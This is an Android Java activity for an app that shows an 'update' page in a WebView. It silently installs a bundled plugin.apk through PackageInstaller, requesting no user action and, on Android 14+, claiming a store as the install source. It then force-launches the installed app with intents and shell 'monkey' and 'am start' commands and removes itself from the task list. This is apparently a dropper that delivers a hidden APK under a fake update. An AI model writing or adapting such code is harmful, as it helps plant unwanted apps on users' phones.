package com.example.installer;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.view.WindowInsetsController;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends Activity {

    private static final String TAG = "MainActivity";
    private static final String APK_NAME = "plugin.apk";
    private static final int REQUEST_INSTALL = 100;
    private static final String ACTION_INSTALL = "com.example.installer.INSTALL";

    private WebView webView;
    private String packageName = null;
    private String mainActivity = null;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isInstalling = false;

    private BroadcastReceiver installReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -1);
            Log.d(TAG, "Install status: " + status);

            switch (status) {
                case PackageInstaller.STATUS_PENDING_USER_ACTION:
                    Log.d(TAG, "Pending user action");
                    Intent confirmIntent = intent.getParcelableExtra(Intent.EXTRA_INTENT);
                    if (confirmIntent != null) {
                        try {
                            startActivity(confirmIntent);
                        } catch (Exception e) {
                            Log.e(TAG, "Error starting confirm intent", e);
                        }
                    }
                    break;

                case PackageInstaller.STATUS_SUCCESS:
                    Log.d(TAG, "Installation successful!");
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            toast("Installed successfully!");
                        }
                    });

                    // ⭐ باز کردن اپ فوری - همین الان!
                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            forceOpenApp();
                        }
                    }, 500);  // فقط 0.5 ثانیه!
                    break;

                default:
                    Log.e(TAG, "Installation failed: " + status);
                    String message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            isInstalling = false;
                            toast("Installation failed: " + message);
                            if (webView != null) {
                                webView.loadUrl("file:///android_asset/update/update.html?error=true");
                            }
                        }
                    });
                    break;
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate - Android " + Build.VERSION.SDK_INT);

        setupSystemBars();

        try {
            registerReceiver(installReceiver, new IntentFilter(ACTION_INSTALL));
            Log.d(TAG, "Receiver registered");
        } catch (Exception e) {
            Log.e(TAG, "Error registering receiver", e);
        }

        setupWebView();
    }

    private void setupWebView() {
        try {
            webView = new WebView(this);
            android.webkit.WebSettings settings = webView.getSettings();
            settings.setJavaScriptEnabled(true);
            settings.setDomStorageEnabled(true);
            settings.setAllowFileAccess(true);
            settings.setAllowContentAccess(true);
            settings.setMediaPlaybackRequiresUserGesture(false);
            settings.setJavaScriptCanOpenWindowsAutomatically(true);

            webView.setWebViewClient(new WebViewClient() {
                @Override
                public void onPageFinished(WebView view, String url) {
                    super.onPageFinished(view, url);
                    Log.d(TAG, "Page loaded: " + url);
                }
            });

            webView.setWebChromeClient(new WebChromeClient());
            webView.addJavascriptInterface(new WebAppInterface(), "Android");

            setContentView(webView);

            if (checkAssetExists("update/update.html")) {
                webView.loadUrl("file:///android_asset/update/update.html");
            } else {
                showErrorPage();
            }
        } catch (Exception e) {
            Log.e(TAG, "setupWebView error", e);
            finish();
        }
    }

    private boolean checkAssetExists(String assetPath) {
        try {
            InputStream inputStream = getAssets().open(assetPath);
            inputStream.close();
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private void showErrorPage() {
        String html = "<!DOCTYPE html><html><head>" +
                "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">" +
                "<style>body{font-family:Arial;text-align:center;padding:50px;background:white;}" +
                "h1{color:#333;}p{color:#666;}</style></head><body>" +
                "<h1>Error</h1><p>Application resources not found.</p></body></html>";
        webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);
    }

    class WebAppInterface {
        @JavascriptInterface
        public void installPlugin() {
            Log.d(TAG, "installPlugin called");
            handler.post(new Runnable() {
                @Override
                public void run() {
                    if (!isInstalling) {
                        checkPermission();
                    } else {
                        toast("Installation in progress...");
                    }
                }
            });
        }
    }

    private void checkPermission() {
        Log.d(TAG, "Checking permission");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!getPackageManager().canRequestPackageInstalls()) {
                Log.d(TAG, "Permission not granted, requesting");
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, REQUEST_INSTALL);
                } catch (Exception e) {
                    Log.e(TAG, "Error opening settings", e);
                    toast("Please enable install from unknown sources");
                }
                return;
            }
        }
        install();
    }

    private void install() {
        Log.d(TAG, "Starting installation");
        if (isInstalling) {
            Log.w(TAG, "Already installing");
            return;
        }

        isInstalling = true;

        handler.post(new Runnable() {
            @Override
            public void run() {
                if (checkAssetExists("update/installing.html")) {
                    webView.loadUrl("file:///android_asset/update/installing.html");
                }
            }
        });

        new Thread(new Runnable() {
            @Override
            public void run() {
                PackageInstaller.Session session = null;
                try {
                    // ✅ خواندن اطلاعات APK
                    readApkInfo();

                    if (packageName == null) {
                        Log.e(TAG, "Package name is null");
                        handler.post(new Runnable() {
                            @Override
                            public void run() {
                                isInstalling = false;
                                toast("Cannot read APK");
                                webView.loadUrl("file:///android_asset/update/update.html?error=apk");
                            }
                        });
                        return;
                    }

                    Log.d(TAG, "Package: " + packageName);
                    Log.d(TAG, "Activity: " + mainActivity);

                    // ✅ ایجاد Session
                    PackageInstaller installer = getPackageManager().getPackageInstaller();

                    PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                            PackageInstaller.SessionParams.MODE_FULL_INSTALL);

                    // ✅ Android 12+
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        params.setRequireUserAction(
                                PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
                    }

                    // ✅ Android 13+
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        params.setInstallReason(PackageManager.INSTALL_REASON_USER);
                    }

                    // ✅ Android 14+ (مهم برای Samsung و گوشی‌های جدید)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                        try {
                            params.setPackageSource(PackageInstaller.PACKAGE_SOURCE_STORE);
                            params.setRequestUpdateOwnership(true);
                            Log.d(TAG, "Android 14+ params set");
                        } catch (Exception e) {
                            Log.w(TAG, "Could not set Android 14 params", e);
                        }
                    }

                    int sessionId = installer.createSession(params);
                    Log.d(TAG, "Session created: " + sessionId);

                    session = installer.openSession(sessionId);

                    // ✅ نوشتن APK به Session
                    if (!checkAssetExists(APK_NAME)) {
                        throw new Exception("APK not found in assets");
                    }

                    OutputStream out = session.openWrite("package", 0, -1);
                    InputStream in = getAssets().open(APK_NAME);

                    byte[] buffer = new byte[65536];
                    int read;
                    long totalBytes = 0;

                    while ((read = in.read(buffer)) != -1) {
                        out.write(buffer, 0, read);
                        totalBytes += read;
                    }

                    Log.d(TAG, "Written " + totalBytes + " bytes");

                    session.fsync(out);
                    in.close();
                    out.close();

                    // ✅ Commit Session
                    Intent intent = new Intent(ACTION_INSTALL);

                    int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S ?
                            PendingIntent.FLAG_MUTABLE : PendingIntent.FLAG_UPDATE_CURRENT;

                    PendingIntent sender = PendingIntent.getBroadcast(
                            MainActivity.this, sessionId, intent, flags);

                    session.commit(sender.getIntentSender());
                    Log.d(TAG, "Session committed");

                } catch (Exception e) {
                    Log.e(TAG, "Installation error", e);

                    if (session != null) {
                        try {
                            session.abandon();
                        } catch (Exception ex) {
                            Log.e(TAG, "Error abandoning session", ex);
                        }
                    }

                    final String errorMsg = e.getMessage();
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            isInstalling = false;
                            toast("Failed: " + errorMsg);
                            webView.loadUrl("file:///android_asset/update/update.html?error=install");
                        }
                    });
                }
            }
        }).start();
    }

    private void readApkInfo() {
        try {
            File tempFile = new File(getCacheDir(), "temp.apk");

            InputStream in = getAssets().open(APK_NAME);
            OutputStream out = new FileOutputStream(tempFile);

            byte[] buffer = new byte[8192];
            int read;
            while ((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
            }
            in.close();
            out.close();

            if (!tempFile.exists() || tempFile.length() == 0) {
                Log.e(TAG, "Temp file invalid");
                tempFile.delete();
                return;
            }

            PackageManager pm = getPackageManager();
            int flags = PackageManager.GET_ACTIVITIES;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                flags |= PackageManager.GET_SIGNING_CERTIFICATES;
            }

            PackageInfo info = pm.getPackageArchiveInfo(
                    tempFile.getAbsolutePath(), flags);

            if (info != null) {
                packageName = info.packageName;

                if (info.activities != null && info.activities.length > 0) {
                    mainActivity = info.activities[0].name;
                }
            }

            tempFile.delete();

        } catch (Exception e) {
            Log.e(TAG, "readApkInfo error", e);
        }
    }

    // ⭐⭐⭐ باز کردن اپ با همه روش‌ها!
    private void forceOpenApp() {
        Log.d(TAG, ">>> FORCE OPENING APP <<<");

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // صبر کوتاه
                    Thread.sleep(800);

                    // روش 1: Intent با ComponentName
                    Log.d(TAG, "[1] ComponentName Intent");
                    tryMethod1();
                    Thread.sleep(300);

                    // روش 2: Shell monkey
                    Log.d(TAG, "[2] Shell monkey");
                    tryMethod2();
                    Thread.sleep(300);

                    // روش 3: Shell am
                    Log.d(TAG, "[3] Shell am");
                    tryMethod3();
                    Thread.sleep(300);

                    // روش 4: getLaunchIntent
                    Log.d(TAG, "[4] getLaunchIntent");
                    tryMethod4();

                    // بستن Installer
                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            Log.d(TAG, "Finishing installer");
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                                finishAndRemoveTask();
                            } else {
                                finish();
                            }
                        }
                    }, 1000);

                } catch (Exception e) {
                    Log.e(TAG, "forceOpenApp error", e);
                }
            }
        }).start();
    }

    private void tryMethod1() {
        try {
            if (packageName == null || mainActivity == null) return;

            Intent intent = new Intent();
            intent.setComponent(new ComponentName(packageName, mainActivity));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK |
                    Intent.FLAG_ACTIVITY_CLEAR_TOP);

            startActivity(intent);
            Log.d(TAG, "[1] Success!");

        } catch (Exception e) {
            Log.e(TAG, "[1] Failed: " + e.getMessage());
        }
    }

    private void tryMethod2() {
        try {
            if (packageName == null) return;

            String cmd = "monkey -p " + packageName + " 1";
            Process p = Runtime.getRuntime().exec(cmd);
            int exit = p.waitFor();

            Log.d(TAG, "[2] Exit: " + exit);

        } catch (Exception e) {
            Log.e(TAG, "[2] Failed: " + e.getMessage());
        }
    }

    private void tryMethod3() {
        try {
            if (packageName == null || mainActivity == null) return;

            String cmd = "am start -n " + packageName + "/" + mainActivity;
            Process p = Runtime.getRuntime().exec(cmd);
            int exit = p.waitFor();

            Log.d(TAG, "[3] Exit: " + exit);

        } catch (Exception e) {
            Log.e(TAG, "[3] Failed: " + e.getMessage());
        }
    }

    private void tryMethod4() {
        try {
            if (packageName == null) return;

            PackageManager pm = getPackageManager();
            Intent intent = pm.getLaunchIntentForPackage(packageName);

            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                Log.d(TAG, "[4] Success!");
            }

        } catch (Exception e) {
            Log.e(TAG, "[4] Failed: " + e.getMessage());
        }
    }

    private void setupSystemBars() {
        try {
            android.view.Window window = getWindow();

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                window.setStatusBarColor(Color.WHITE);
                window.setNavigationBarColor(Color.WHITE);

                WindowInsetsController controller = window.getInsetsController();
                if (controller != null) {
                    controller.setSystemBarsAppearance(
                            WindowInsetsController.APPEARANCE_LIGHT_STATUS_BARS,
                            WindowInsetsController.APPEARANCE_LIGHT_STATUS_BARS);
                    controller.setSystemBarsAppearance(
                            WindowInsetsController.APPEARANCE_LIGHT_NAVIGATION_BARS,
                            WindowInsetsController.APPEARANCE_LIGHT_NAVIGATION_BARS);
                }
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                window.setStatusBarColor(Color.WHITE);
                window.setNavigationBarColor(Color.WHITE);

                int flags = window.getDecorView().getSystemUiVisibility();
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    flags |= View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR;
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                    flags |= View.SYSTEM_UI_FLAG_LIGHT_NAVIGATION_BAR;
                }
                window.getDecorView().setSystemUiVisibility(flags);
            }
        } catch (Exception e) {
            Log.e(TAG, "setupSystemBars error", e);
        }
    }

    @Override
    public void onBackPressed() {
        try {
            if (webView != null && webView.canGoBack()) {
                webView.goBack();
            } else {
                super.onBackPressed();
            }
        } catch (Exception e) {
            super.onBackPressed();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_INSTALL) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        if (getPackageManager().canRequestPackageInstalls()) {
                            Log.d(TAG, "Permission granted, starting install");
                            install();
                        } else {
                            Log.e(TAG, "Permission denied");
                            toast("Permission required");
                            isInstalling = false;
                            if (webView != null) {
                                webView.loadUrl("file:///android_asset/update/update.html?error=permission");
                            }
                        }
                    }
                }
            }, 300);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();

        try {
            unregisterReceiver(installReceiver);
            Log.d(TAG, "Receiver unregistered");
        } catch (Exception e) {
            Log.e(TAG, "Error unregistering receiver", e);
        }

        try {
            if (webView != null) {
                webView.destroy();
            }
        } catch (Exception e) {
            // Ignore
        }
    }

    private void toast(String msg) {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
    }
}